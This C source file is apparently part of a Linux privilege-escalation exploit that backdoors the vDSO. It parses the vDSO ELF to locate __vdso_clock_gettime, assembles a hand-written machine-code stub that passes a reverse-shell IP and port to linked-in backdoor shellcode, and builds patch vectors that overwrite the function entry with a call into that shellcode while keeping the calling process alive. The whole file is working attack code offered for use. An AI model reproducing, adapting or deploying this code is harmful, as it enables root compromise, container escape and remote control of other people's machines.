//
// Created by explorer on 2022/12/9.
//

#include "vdso_backdoor.h"
#include <stdlib.h>
#include <stdint.h>
#include <elf.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/auxv.h>
#include <string.h>
#include "unit.h"
// parse vdso and return vdso patch vector

void *get_vdso_base() {
    return (void *) getauxval(AT_SYSINFO_EHDR);
}

#ifndef DT_GNU_HASH
#define DT_GNU_HASH 0x6ffffef5
#endif

struct vdso_layout {
    unsigned int clock_offset;
    unsigned int size;
    unsigned int used_end;
};

static void *vdso_vaddr_to_ptr(uintptr_t base, uint64_t image_base,
                               const Elf64_Phdr *ph, int phnum, uint64_t vaddr) {
    for (int i = 0; i < phnum; i++) {
        if (ph[i].p_type != PT_LOAD)
            continue;
        if (vaddr >= ph[i].p_vaddr && vaddr < ph[i].p_vaddr + ph[i].p_filesz) {
            return (void *) (base + ph[i].p_offset + (vaddr - ph[i].p_vaddr));
        }
    }
    return NULL;
}

static unsigned int vdso_sym_count(uintptr_t base, uint64_t image_base,
                                   const Elf64_Phdr *ph, int phnum,
                                   uint64_t hash_vaddr, uint64_t gnu_hash_vaddr) {
    if (hash_vaddr) {
        uint32_t *hash = vdso_vaddr_to_ptr(base, image_base, ph, phnum, hash_vaddr);
        if (hash)
            return hash[1]; /* nchain */
    }
    if (gnu_hash_vaddr) {
        uint32_t *gh = vdso_vaddr_to_ptr(base, image_base, ph, phnum, gnu_hash_vaddr);
        if (!gh)
            return 0;
        uint32_t nbuckets = gh[0];
        uint32_t symoffset = gh[1];
        uint32_t bloom_size = gh[2];
        uint32_t *buckets = gh + 4 + bloom_size * 2; /* bloom words are 8 bytes */
        uint32_t *chains = buckets + nbuckets;
        unsigned int max_sym = 0;
        for (uint32_t i = 0; i < nbuckets; i++) {
            uint32_t idx = buckets[i];
            if (!idx)
                continue;
            uint32_t *chain = chains + (idx - symoffset);
            for (int guard = 0; guard < 1000000; guard++) {
                uint32_t value = *chain;
                if (idx > max_sym)
                    max_sym = idx;
                if (value & 1)
                    break;
                idx++;
                chain++;
            }
        }
        return max_sym + 1;
    }
    return 0;
}

static int vdso_maps_size(uintptr_t base, unsigned int *size) {
    FILE *fp = fopen("/proc/self/maps", "r");
    if (!fp)
        return -1;
    char line[512];
    char path[256];
    unsigned long start, end;
    int ret = -1;
    while (fgets(line, sizeof(line), fp)) {
        path[0] = 0;
        if (sscanf(line, "%lx-%lx %*s %*s %*s %*s %255s", &start, &end, path) < 3)
            continue;
        if (strstr(path, "[vdso]") && base >= start && base < end) {
            *size = (unsigned int) (end - start);
            ret = 0;
            break;
        }
    }
    fclose(fp);
    return ret;
}

static int detect_vdso_layout(uintptr_t base, struct vdso_layout *layout) {
    const Elf64_Ehdr *eh = (const Elf64_Ehdr *) base;
    if (memcmp(eh->e_ident, ELFMAG, SELFMAG) != 0 ||
        eh->e_ident[EI_CLASS] != ELFCLASS64 ||
        eh->e_ident[EI_DATA] != ELFDATA2LSB ||
        eh->e_type != ET_DYN ||
        eh->e_machine != EM_X86_64 ||
        eh->e_phentsize != sizeof(Elf64_Phdr) ||
        eh->e_phnum == 0) {
        return -1;
    }

    const Elf64_Phdr *ph = (const Elf64_Phdr *) (base + eh->e_phoff);
    uint64_t image_base = UINT64_MAX;
    uint64_t used_end = 0;
    const Elf64_Phdr *dynamic = NULL;
    for (int i = 0; i < eh->e_phnum; i++) {
        if (ph[i].p_type == PT_LOAD) {
            if (ph[i].p_vaddr < image_base)
                image_base = ph[i].p_vaddr;
            uint64_t end = ph[i].p_vaddr + ph[i].p_memsz;
            if (end > used_end)
                used_end = end;
        } else if (ph[i].p_type == PT_DYNAMIC) {
            dynamic = &ph[i];
        }
    }
    if (image_base == UINT64_MAX || !dynamic)
        return -1;

    const Elf64_Dyn *dyn = vdso_vaddr_to_ptr(base, image_base, ph, eh->e_phnum, dynamic->p_vaddr);
    if (!dyn)
        return -1;

    uint64_t symtab = 0, strtab = 0, hash = 0, gnu_hash = 0, strsz = 0;
    for (; dyn->d_tag != DT_NULL; dyn++) {
        switch (dyn->d_tag) {
            case DT_SYMTAB:
                symtab = dyn->d_un.d_ptr;
                break;
            case DT_STRTAB:
                strtab = dyn->d_un.d_ptr;
                break;
            case DT_HASH:
                hash = dyn->d_un.d_ptr;
                break;
            case DT_GNU_HASH:
                gnu_hash = dyn->d_un.d_ptr;
                break;
            case DT_STRSZ:
                strsz = dyn->d_un.d_val;
                break;
            default:
                break;
        }
    }
    if (!symtab || !strtab || !strsz)
        return -1;

    const Elf64_Sym *syms = vdso_vaddr_to_ptr(base, image_base, ph, eh->e_phnum, symtab);
    const char *strs = vdso_vaddr_to_ptr(base, image_base, ph, eh->e_phnum, strtab);
    if (!syms || !strs)
        return -1;

    unsigned int count = vdso_sym_count(base, image_base, ph, eh->e_phnum, hash, gnu_hash);
    if (!count)
        return -1;

    unsigned int clock_offset = 0;
    for (unsigned int i = 0; i < count; i++) {
        if (syms[i].st_name >= strsz)
            continue;
        const char *name = strs + syms[i].st_name;
        if (strcmp(name, "__vdso_clock_gettime") != 0)
            continue;
        for (int j = 0; j < eh->e_phnum; j++) {
            if (ph[j].p_type != PT_LOAD)
                continue;
            if (syms[i].st_value >= ph[j].p_vaddr &&
                syms[i].st_value < ph[j].p_vaddr + ph[j].p_filesz) {
                clock_offset = (unsigned int) (ph[j].p_offset +
                                               (syms[i].st_value - ph[j].p_vaddr));
                break;
            }
        }
        break;
    }
    if (!clock_offset)
        return -1;

    unsigned int size = 0;
    if (vdso_maps_size(base, &size) != 0 || size == 0) {
        unsigned long page = (unsigned long) sysconf(_SC_PAGESIZE);
        if (!page)
            page = 4096;
        uint64_t used = used_end - image_base;
        size = (unsigned int) ((used + page - 1) & ~(page - 1));
    }
    if (size <= clock_offset + 8)
        return -1;

    layout->clock_offset = clock_offset;
    layout->size = size;
    layout->used_end = (unsigned int) (used_end - image_base);
    return 0;
}

unsigned int get_backdoor_shellcode(unsigned char **shellcode_p, unsigned int *code_size) {
    extern unsigned char shellcode[];
    extern unsigned int shellcode_size;
    if (code_size) {
        *code_size = shellcode_size;
    }
    if (shellcode_p) {
        *shellcode_p = shellcode;
    }
    return shellcode_size;
}

unsigned int build_shellcode(unsigned char **shellcode_p, unsigned int *shellcode_size_p, unsigned int target_ip,
                             unsigned short target_port) {
    unsigned char *shellcode;
    unsigned int shellcode_size;
    /*
     * Stub installed at the __vdso_clock_gettime entry.
     *
     * rdi/rsi (clockid/timespec) are saved, then the backdoor shellcode is
     * called with the reverse ip/port.  If the backdoor declines to run
     * (non-root caller, container PID namespace, ...), it returns here:
     * perform the real clock_gettime syscall and return cleanly to the
     * caller.  The original entry prologue was overwritten and cannot be
     * resumed safely, so the syscall path keeps the calling process (and
     * the container's PID 1) alive.
     */
    static unsigned char call_shellcode_payload[] = {
        0x57, 0x56,                                     /* push rdi; push rsi */
        0x68, 0x63, 0x63, 0x63, 0x63,                   /* push <ip> */
        0x5f,                                           /* pop rdi */
        0x68, 0x62, 0x62, 0x00, 0x00,                   /* push <port> */
        0x5e,                                           /* pop rsi */
        0xe8, 0x0d, 0x00, 0x00, 0x00,                   /* call shellcode body */
        0x5e, 0x5f,                                     /* pop rsi; pop rdi */
        0xb8, 0xe4, 0x00, 0x00, 0x00,                   /* mov eax, __NR_clock_gettime */
        0x0f, 0x05,                                     /* syscall */
        0x59, 0x59,                                     /* drop hook return, pop caller return */
        0xff, 0xe1                                      /* jmp caller */
    };

    get_backdoor_shellcode(&shellcode, &shellcode_size);

    unsigned char *new_shellcode = malloc(shellcode_size + sizeof(call_shellcode_payload));

    memcpy(new_shellcode, call_shellcode_payload, sizeof(call_shellcode_payload));
    memcpy(new_shellcode + sizeof(call_shellcode_payload), shellcode, shellcode_size);
    *(unsigned int *) (new_shellcode + 1+2) = target_ip;
    *(unsigned short *) (new_shellcode + 7+2) = target_port;

    if (shellcode_size_p) {
        *shellcode_size_p = shellcode_size + sizeof(call_shellcode_payload);
    }

    if (shellcode_p) {
        *shellcode_p = new_shellcode;
    }

    return shellcode_size;

}


unsigned int
get_vdso_patch_vec(struct mem_vec **vecs_p, unsigned int *size, unsigned char *shellcode, unsigned int shellcode_size) {
    uintptr_t base = (uintptr_t) get_vdso_base();
    struct vdso_layout layout;

    if (!base || detect_vdso_layout(base, &layout) != 0) {
        fprintf(stderr, "vdso: cannot locate __vdso_clock_gettime\n");
        exit(-1);
    }
    if (layout.size <= shellcode_size + 16) {
        fprintf(stderr, "vdso: mapping too small for shellcode\n");
        exit(-1);
    }

    unsigned int shellcode_offset = layout.size - shellcode_size - 16;
    if (shellcode_offset <= layout.clock_offset + 8 ||
        shellcode_offset < layout.used_end) {
        fprintf(stderr, "vdso: no safe space for shellcode (size=0x%x used=0x%x hook=0x%x)\n",
                layout.size, layout.used_end, layout.clock_offset);
        exit(-1);
    }

    printf("vdso: __vdso_clock_gettime offset=0x%x, mapping size=0x%x\n",
           layout.clock_offset, layout.size);
    fflush(stdout);

    unsigned char *base_addr = (unsigned char *) base;
    static char payload_buf[8];

    if (vecs_p) {
        struct mem_vec *vecs = malloc(sizeof(struct mem_vec) * 2);
        *vecs_p = vecs;
        vecs[0].address = base_addr + shellcode_offset; // TODO:!!!
        vecs[0].data = shellcode;
        vecs[0].size = shellcode_size;

        char *p = payload_buf;
        p[0] = '\xe8';
        *(uint32_t *) (p + 1) = shellcode_offset - layout.clock_offset - 5;
        p[5] = '\x90';
        p[6] = '\x90';
        p[7] = '\x90';
        vecs[1].address = base_addr + layout.clock_offset;
        vecs[1].size = 8; // TODO: fuck align
        vecs[1].data = payload_buf;
    }
    if (size) {
        *size = 2;
    }
    return 2;
}

